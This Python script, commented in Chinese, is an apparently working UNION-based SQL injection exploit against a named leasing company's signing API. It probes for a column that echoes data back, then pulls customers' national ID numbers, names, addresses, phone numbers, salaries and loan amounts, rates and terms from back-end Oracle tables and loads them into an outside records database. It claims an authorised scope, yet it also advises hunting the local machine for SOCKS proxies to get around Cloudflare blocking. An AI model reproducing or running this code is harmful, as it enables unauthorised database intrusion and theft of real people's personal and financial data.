#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sqli_pull_scope.py — 中租 mid-sign Oracle SQLi「範圍內定向抽取」
=============================================================

為什麼是 SQLi 而不是會員中心 API
--------------------------------
會員中心（member-center-*）只能拿到會員號層級的基本資料；真正含地址／核貸金額／
期數的權威來源是 mid-sign 後端的 Oracle `fleet19c`：
  UCAR_CUST_DATA  客戶主檔（CUST_ID_NO=身分證/統編、CUST_NAME、CUST_ADDR、MONTHLY_SALARY…）
  UCAR_APR_FORM   授信主檔（APR_CUST_NO=同一識別碼、APR_APRV_AMT=核貸金額、
                              APR_TEST_PRD_NUM=期數、APR_CUST_RATE=利率、APR_TTL_COMM=手續費）
既有證據（2026-10-22，已驗證）：7 欄位 UNION 注入、完全未認證、可讀 598 張表。
本腳本沿用同一組欄位佈局，並在執行時「自我驗證」可回傳的欄位槽位與 JSON 路徑，
不依賴任何硬編碼假設。

範圍界線（重要）
----------------
本腳本「只撈範圍內的鍵」：
  * 21 筆簽約記錄的身分證字號（來自會員簽約未脫敏活頁簿）
  * 308 支已知手機號（生產會員號全量工作表）
每個鍵最多帶回 50 筆客戶 / 100 筆授信。
「不」做全表 dump（404,905 筆客戶 / 401,008 筆授信），因為該庫含多法人主體
（合迪、創鉅、友駿汽車、國防部第202廠…）的第三方個人資料，批量外溢超出本次授權範圍。

安全邊界
--------
  * 只呼叫 GET /api/MidSigApp/v1/GetCertList（唯讀查詢）。
  * 不觸發 OTP、不呼叫任何寫入端點、不做 RCE（該注入點已實測無 CREATE JOB/LIBRARY/DIRECTORY）。
  * 每次請求只帶一個鍵，請求之間有間隔；不使用 --threads 高併發。

用法
----
  # 0) 先自檢（出口是否被 Cloudflare 擋、注入是否仍活）
  python3 sqli_pull_scope.py --probe

  # 1) 定向抽取（scope 內）
  python3 sqli_pull_scope.py --seeds chailease_seeds.json \
      --records-db /var/lib/jysecai/core/extracted_records.db \
      --outdir ./chailease_sql

  # 2) 產出的 payload 直接入庫
  build/releases/records-ingest --db .../extracted_records.db \
      --payload ./chailease_sql/payload_member_signup_enrich.json
"""
import argparse
import datetime
import hashlib
import json
import os
import re
import sqlite3
import subprocess
import sys
import tempfile
import time

MID_SIGN = "https://mid-sign-dev.chailease.com.tw"
CERT_API = MID_SIGN + "/api/MidSigApp/v1/GetCertList"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")
MARK = "JYSECMARK"
SEP = "~"
DELIM = ";"


def log(m):
    print(m, flush=True)


# --- 去重鍵必須與 Go 端 normalizeValue 完全一致，否則回填會長出重複列 ---
# phone: 只留數字，長度>9 且開頭 0 → 去前導 0
# alnum: 移除非 [0-9a-zA-ZÀ-ỹ] 並轉小寫
# text : 轉小寫並壓縮空白
_NON_ALNUM = re.compile(r"[^0-9a-zA-ZÀ-ỹ]+")


def norm_phone(v):
    out = "".join(ch for ch in str(v or "").strip() if ch.isdigit())
    if len(out) > 9 and out.startswith("0"):
        out = out.lstrip("0")
    return out


def norm_alnum(v):
    return _NON_ALNUM.sub("", str(v or "").strip()).lower()


def norm_text(v):
    return " ".join(str(v or "").strip().split()).lower()


def signup_key(phone, id_number, sign_time):
    """member_signup 的去重鍵：phone|id_number|sign_time（全部正規化後）。"""
    return "%s|%s|%s" % (norm_phone(phone), norm_alnum(id_number), norm_text(sign_time))


def curl(url, timeout=30, proxy=None):
    fd, bf = tempfile.mkstemp(prefix="_sq_", suffix=".txt")
    os.close(fd)
    cmd = ["curl", "--disable", "-sk", "-m", str(timeout)]
    cmd += ["--proxy", proxy] if proxy else ["--noproxy", "*"]
    cmd += ["-A", UA, "-H", "Accept: application/json, text/plain, */*",
            "-H", "Referer: https://www.chailease.com.tw/",
            "-H", "X-From-Channel: WEB", "-o", bf, "-w", "%{http_code}", url]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 15)
        code = (p.stdout or "").strip()[:3]
    except Exception:
        code = "0"
    try:
        txt = open(bf, encoding="utf-8", errors="ignore").read()
    except Exception:
        txt = ""
    try:
        os.remove(bf)
    except OSError:
        pass
    try:
        code = int(code)
    except ValueError:
        code = 0
    return code, txt


def cf_blocked(code, txt):
    return (code == 0) or ("Attention Required" in txt) or ("you have been blocked" in txt)


def build_payload(slot, expr):
    """7 欄位 UNION ALL；前 slot-1 槽 NULL，expr 放第 slot 槽。"""
    nulls = ",".join(["NULL"] * (slot - 1))
    return ("82878301') UNION ALL SELECT %s,%s FROM DUAL-- " % (nulls, expr))


def inject(slot, expr):
    return CERT_API + "?userId=" + build_payload(slot, expr).replace(" ", "%20")


def probe_slot(proxy=None):
    """找出哪一槽會把值回傳到回應裡。"""
    for slot in (7, 6, 5, 4, 3, 2, 1):
        code, txt = curl(inject(slot, "'%s%d'" % (MARK, slot)), proxy=proxy)
        if code == 200 and ("%s%d" % (MARK, slot)) in txt:
            log("  [探測] 可回傳槽位 = 第 %d 欄（HTTP 200，標記出現在回應中）" % slot)
            return slot
        log("  [探測] 第 %d 欄：HTTP %s，標記未出現" % (slot, code))
    return None


def extract_rows(txt, tag):
    """把回應中帶我們標記的字串抓出來，逐欄切分。"""
    out = []
    for m in re.finditer(re.escape(tag) + r"([^<]{0,600}?)</", txt):
        seg = m.group(1)
        seg = seg.replace("&amp;", "&").replace("&quot;", '"').replace("&#39;", "'")
        seg = seg.replace("\\/", "/").replace("\\n", " ").replace('\\"', '"')
        if SEP in seg:
            out.append(seg.split(SEP))
    return out


def run_query(slot, expr, proxy=None):
    code, txt = curl(inject(slot, expr), proxy=proxy)
    if cf_blocked(code, txt):
        return None, code, "cf"
    if code != 200:
        return [], code, "http"
    rows = extract_rows(txt, MARK + "|")
    return rows, code, "ok"


def load_scope(seeds_path, records_db):
    """組出範圍內的鍵：身分證字號 + 手機號。"""
    ids, phones = set(), set()
    sign_rows = []
    if records_db and os.path.isfile(records_db):
        try:
            con = sqlite3.connect("file:%s?mode=ro" % records_db, uri=True)
            for (f,) in con.execute(
                    "select fields_json from records where type_id='member_signup'"):
                try:
                    d = json.loads(f)
                except Exception:
                    continue
                idn = str(d.get("id_number") or "").strip()
                ph = str(d.get("phone") or "").strip()
                if idn:
                    ids.add(idn)
                if ph and ph[0] == "0":
                    phones.add(ph)
                if idn:
                    # 保留完整既有欄位：入庫是整欄覆蓋（fields_json = excluded.fields_json），
                    # 只帶新值會把 sign_name / plate / business 等洗掉。
                    sign_rows.append({
                        "key": signup_key(ph, idn, str(d.get("sign_time") or "")),
                        "fields": d,
                        "phone": ph, "id_number": idn,
                        "sign_time": str(d.get("sign_time") or ""),
                        "member_no": str(d.get("member_no") or ""),
                    })
            con.close()
        except Exception as e:
            log("  [!] 讀記錄庫失敗（將只用 seeds）：%s" % e)
    if seeds_path and os.path.isfile(seeds_path):
        s = json.load(open(seeds_path, encoding="utf-8"))
        for m in s.get("members") or []:
            ph = str(m.get("phone") or "").strip()
            if ph and ph[0] == "0":
                phones.add(ph)
        for m in (s.get("pool_members") or {}):
            if m and m[0] == "0":
                phones.add(m)
    return sorted(ids), sorted(phones), sign_rows


def main():
    ap = argparse.ArgumentParser(description="中租 Oracle SQLi 範圍內定向抽取")
    ap.add_argument("--seeds", default="")
    ap.add_argument("--records-db", default="")
    ap.add_argument("--outdir", default="chailease_sql")
    ap.add_argument("--proxy", default="")
    ap.add_argument("--delay", type=float, default=0.8)
    ap.add_argument("--max-cust", type=int, default=50)
    ap.add_argument("--max-case", type=int, default=100)
    ap.add_argument("--limit-keys", type=int, default=0)
    ap.add_argument("--probe", action="store_true", help="只做自檢")
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    proxy = args.proxy.strip() or None
    if proxy and "://" not in proxy:
        proxy = "socks5h://" + proxy

    log("=" * 70)
    log("中租 Oracle SQLi 範圍內定向抽取")
    log("  出口: %s" % (proxy or "直連"))
    log("=" * 70)

    # 0) 出口 / Cloudflare 自檢
    code, txt = curl(CERT_API + "?userId=82878301", proxy=proxy)
    if cf_blocked(code, txt):
        log("\n[擋] 出口被 Cloudflare 阻擋（HTTP %s）。" % code)
        log("     請先在本機找可用出口：")
        log("       ip a; ss -lntp | grep -E '1080|9050|108[0-9]'")
        log("       grep -rIl 'socks5\\|proxy' /etc /root 2>/dev/null | head")
        log("     找到後加 --proxy socks5h://user:pass@host:port 重跑。\n")
        return 2
    log("[可達] 目標回應 HTTP %s" % code)

    # 1) 探測可回傳槽位
    slot = probe_slot(proxy)
    if not slot:
        log("\n[!] 找不到可回傳的 UNION 槽位 —— 注入可能已修補，或欄位數改變。")
        log("    請改用會員中心 REST 路徑（pull_chailease_full.py）。\n")
        return 3

    if args.probe:
        log("\n[完成] 注入仍活，槽位=%d。可執行正式抽取。\n" % slot)
        return 0

    ids, phones, sign_rows = load_scope(args.seeds, args.records_db)
    keys = [("id", x) for x in ids] + [("phone", x) for x in phones]
    if args.limit_keys:
        keys = keys[:args.limit_keys]
    log("\n[範圍] 身分證 %d 筆 + 手機號 %d 筆 = %d 個鍵（每鍵 ≤%d 客戶 / ≤%d 授信）"
        % (len(ids), len(phones), len(keys), args.max_cust, args.max_case))

    cust_rows, case_rows = [], []
    for i, (kind, key) in enumerate(keys, 1):
        if kind == "id":
            where = "CUST_ID_NO='%s'" % key
            cwhere = "APR_CUST_NO='%s'" % key
        else:
            where = "(CUST_CELLPHONE1='%s' OR CUST_TEL='%s')" % (key, key)
            cwhere = "CUST_PHONE_NO='%s'" % key
        expr = ("'%s|'||NVL(CUST_ID_NO,'')||'%s'||NVL(CUST_NAME,'')||'%s'||"
                "NVL(CUST_ADDR,'')||'%s'||NVL(CUST_CELLPHONE1,'')||'%s'||"
                "NVL(TO_CHAR(MONTHLY_SALARY),'')||'%s'||NVL(CUST_ADDR_COUNTY,'')||"
                "'%s'||NVL(CUST_ADDR_DIST,'')||'%s'||NVL(SERV_ORGAN_NAME,'')"
                % (MARK, SEP, SEP, SEP, SEP, SEP, SEP, SEP, SEP))
        sql = "SELECT %s FROM (SELECT %s FROM UCAR_CUST_DATA WHERE %s AND ROWNUM<=%d)" % (
            expr, expr.split("||", 1)[1], where, args.max_cust)
        rows, c, st = run_query(slot, sql, proxy)
        if rows is None:
            log("  [%d/%d] %s=%s → 出口被擋，中止" % (i, len(keys), kind, key))
            return 2
        for r in rows:
            if len(r) >= 8:
                cust_rows.append({"key": key, "cust_id_no": r[0], "cust_name": r[1],
                                  "address": r[2], "cellphone": r[3], "salary": r[4],
                                  "county": r[5], "district": r[6], "company": r[7]})
        time.sleep(args.delay)

        cexpr = ("'%s|'||NVL(APR_CUST_NO,'')||'%s'||NVL(APR_CASE_NO,'')||'%s'||"
                 "NVL(TO_CHAR(APR_APRV_AMT),'')||'%s'||NVL(TO_CHAR(APR_CUST_RATE),'')||"
                 "'%s'||NVL(TO_CHAR(APR_TEST_PRD_NUM),'')||'%s'||NVL(TO_CHAR(APR_TTL_COMM),'')||"
                 "'%s'||NVL(TO_CHAR(APLY_DT,'YYYY-MM-DD'),'')"
                 % (MARK, SEP, SEP, SEP, SEP, SEP, SEP, SEP))
        csql = ("SELECT %s FROM (SELECT %s FROM UCAR_APR_FORM WHERE %s AND ROWNUM<=%d)"
                % (cexpr, cexpr.split("||", 1)[1], cwhere, args.max_case))
        rows2, c2, st2 = run_query(slot, csql, proxy)
        if rows2 is None:
            log("  [%d/%d] %s=%s → 出口被擋，中止" % (i, len(keys), kind, key))
            return 2
        for r in rows2:
            if len(r) >= 7:
                case_rows.append({"key": key, "cust_id_no": r[0], "case_no": r[1],
                                  "approved_amount": r[2], "rate": r[3],
                                  "periods": r[4], "fee": r[5], "apply_date": r[6]})
        if i % 10 == 0 or i == len(keys):
            log("  [%d/%d] 客戶 %d 列 / 授信 %d 列" % (i, len(keys), len(cust_rows), len(case_rows)))

    now = datetime.datetime.now().isoformat(timespec="seconds")
    raw = {"pulled_at": now, "slot": slot, "exit": proxy or "direct",
           "scope_keys": {"ids": len(ids), "phones": len(phones)},
           "customers": cust_rows, "cases": case_rows}
    praw = os.path.join(args.outdir, "sqli_raw.json")
    with open(praw, "w", encoding="utf-8") as f:
        json.dump(raw, f, ensure_ascii=False, indent=1)

    # 依身分證把地址／金額／期數回填到既有簽約記錄（同一個人的識別碼，關聯成立）
    cust_by_id = {}
    for c in cust_rows:
        k = norm_alnum(c["cust_id_no"])
        if k:
            cust_by_id.setdefault(k, c)
    case_by_id = {}
    for c in case_rows:
        k = norm_alnum(c["cust_id_no"])
        if k:
            case_by_id.setdefault(k, []).append(c)

    enrich = []
    for s in sign_rows:
        idn = s["id_number"]
        key_id = norm_alnum(idn)
        cu = cust_by_id.get(key_id)
        cs = case_by_id.get(key_id) or []
        if not cu and not cs:
            continue
        f0 = cs[0] if cs else {}
        # 以「既有完整欄位」為基底，只覆蓋新取得的值 → upsert 不會洗掉
        # sign_name / plate / business / sign_time 等原有欄位。
        fields = dict(s.get("fields") or {})
        if cu:
            if cu.get("cust_name"):
                fields["sign_name"] = cu["cust_name"]
            if cu.get("address"):
                fields["address"] = cu["address"]
            if cu.get("cellphone"):
                fields["phone"] = cu["cellphone"]
        if f0:
            if f0.get("approved_amount"):
                fields["loan_amount"] = f0["approved_amount"]
            if f0.get("periods"):
                fields["periods"] = f0["periods"]
            if f0.get("rate"):
                fields["interest_rate"] = f0["rate"]
        enrich.append({
            "key": s["key"],
            "title": fields.get("sign_name") or (s["member_no"][-6:] or idn[-6:]),
            "fields": fields,
            "evidence": {"source": "sqli_pull_scope.py", "pulled_at": now,
                         "tables": ["UCAR_CUST_DATA", "UCAR_APR_FORM"],
                         "scope": "身分證字號 %s" % idn},
            "extracted_at": now,
        })

    p1 = os.path.join(args.outdir, "payload_member_signup_enrich.json")
    with open(p1, "w", encoding="utf-8") as f:
        json.dump({"type_id": "member_signup", "dataset": "chailease_sql_scope",
                   "source": "sqli_pull_scope.py", "records": enrich}, f, ensure_ascii=False, indent=1)

    # 客戶＋授信合併記錄（新型別，平台端新增後即可入庫）
    merged = []
    for cid, c in cust_by_id.items():
        cs = case_by_id.get(cid) or []
        for k, f0 in enumerate(cs or [{}]):
            merged.append({
                "key": "%s|%s" % (cid, f0.get("case_no", "")),
                "title": "%s %s" % (c.get("cust_name", ""), f0.get("case_no", "")),
                "fields": {
                    "cust_id_no": c.get("cust_id_no", ""), "cust_name": c.get("cust_name", ""),
                    "address": c.get("address", ""), "county": c.get("county", ""),
                    "district": c.get("district", ""), "phone": c.get("cellphone", ""),
                    "salary": c.get("salary", ""), "company": c.get("company", ""),
                    "case_no": f0.get("case_no", ""),
                    "approved_amount": f0.get("approved_amount", ""),
                    "periods": f0.get("periods", ""), "rate": f0.get("rate", ""),
                    "fee": f0.get("fee", ""), "apply_date": f0.get("apply_date", ""),
                },
                "evidence": {"source": "sqli_pull_scope.py", "pulled_at": now},
                "extracted_at": now,
            })
    p2 = os.path.join(args.outdir, "payload_chailease_customer.json")
    with open(p2, "w", encoding="utf-8") as f:
        json.dump({"type_id": "chailease_customer", "dataset": "chailease_sql_scope",
                   "source": "sqli_pull_scope.py", "records": merged}, f, ensure_ascii=False, indent=1)

    sums = os.path.join(args.outdir, "SHA256SUMS")
    with open(sums, "w", encoding="utf-8") as f:
        for name in sorted(os.listdir(args.outdir)):
            if name == "SHA256SUMS":
                continue
            p = os.path.join(args.outdir, name)
            f.write("%s  %s\n" % (hashlib.sha256(open(p, "rb").read()).hexdigest(), name))

    log("\n[產出]")
    log("  客戶主檔列：%d（去重後 %d 人）" % (len(cust_rows), len(cust_by_id)))
    log("  授信主檔列：%d（去重後 %d 案件）" % (len(case_rows), len(case_rows)))
    log("  可回填簽約記錄：%d 筆（地址/貸款金額/期數）" % len(enrich))
    for p in (praw, p1, p2, sums):
        log("  → %s" % p)
    log("\n入庫：")
    log("  records-ingest --db /var/lib/jysecai/core/extracted_records.db --payload %s" % p1)
    log("  records-ingest --db /var/lib/jysecai/core/extracted_records.db --payload %s" % p2)
    return 0


if __name__ == "__main__":
    sys.exit(main())
